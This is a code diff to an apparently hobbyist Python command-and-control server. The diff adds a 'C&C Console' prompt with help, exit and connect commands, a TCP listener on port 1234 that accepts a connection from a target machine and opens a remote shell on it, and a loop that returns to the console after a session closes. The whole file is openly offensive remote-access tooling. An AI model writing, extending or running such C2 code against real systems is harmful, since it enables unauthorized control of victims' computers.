@@ -143,6 +143,25 @@ def banner():
 ⚪ https://twitter.com/soumyani1
 	''', 'cyan'))
 
+def help():
+
+	print(colored('''\n
+  				      +------------------------+
+  	    -:~~~~~~~~~~~~~~~~~~~~~~~~|  C&C Console Commands: |~~~~~~~~~~~~~~~~~~~~~~~~:-
+  				      +------------------------+
+  	''','green'))
+	print(colored('''\n
+		help                          :    Shows available Commands 
+
+		exit                          :    To exit out from C&C Console environment
+
+		Connect or connect or CONNECT
+		(linux/windows)               :    To extablish connection and get a shell
+
+''', 'yellow'))
+	print(colored('\t~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~','green'))
+
+
 
 # C2 server function
 def server():
@@ -151,24 +170,43 @@ def server():
 	global trgt
 	global sock
 
-	sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
-	sock.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
-
+	
 	banner()
 
-	ip = "0.0.0.0"                              # listening on any ip, change it (if you wish to)
-	port = 1234                                 # chnage it (if you wish to)
+	while True:
 
-	sock.bind((ip, port))                       # binding ip and port to form a method
-	sock.listen(5)
+	# Getting C2 prompt before getting shell connection
+		command = input(colored("C&C => ",'blue' ,  attrs=['bold']))
 
-	print(colored('''
+		# exiting C2 Console
+		if command == "exit":
+			exit()
+
+		elif command == "help":
+			help()
+			continue
+
+		elif (command == "Connect") or (command == "CONNECT") or (command == "connect"):
+
+			sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
+			sock.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
+
+
+			ip = "0.0.0.0"                              # listening on any ip, change it (if you wish to)
+			port = 1234                                 # chnage it (if you wish to)
+
+			sock.bind((ip, port))                       # binding ip and port to form a method
+			sock.listen(5)
+
+			print(colored('''
 [+] Listening For Incoming Connections''', 'green'))
 
-	trgt, ip = sock.accept()
-	print(colored(f"[+] Connections Established From: {ip}\n", 'green'))
-	print(colored("[+] For help section, type: 'help'", 'green'))
-	print(colored("[!] To terminate the session, type: 'exit'\n", 'blue'))
+			trgt, ip = sock.accept()
+			print(colored(f"[+] Connections Established From: {ip}\n", 'green'))
+			print(colored("[+] For help section, type: 'help'", 'green'))
+			print(colored("[!] To terminate the session, type: 'exit'\n", 'blue'))
+
+			break
 
 
 # Getting a shell from trgt
@@ -190,7 +228,9 @@ def shell():
 			print(colored("\n[*] Closing connection...", 'yellow'))
 			time.sleep(2)
 			print(colored("[-] Connection Closed\n", 'red'))
-			break
+			
+			print(colored("[+] Back to C&C Console\n", 'green', attrs=['bold']))
+			server()
 
 		# Help command ✓
 		elif cmd == "help":
@@ -198,6 +238,8 @@ def shell():
 
 List of available Commands:
 ----------------------------------------------------------------------------------------
+
+help 						  :    Shows available Commands 
 
 exit                          :    To terminate session
 
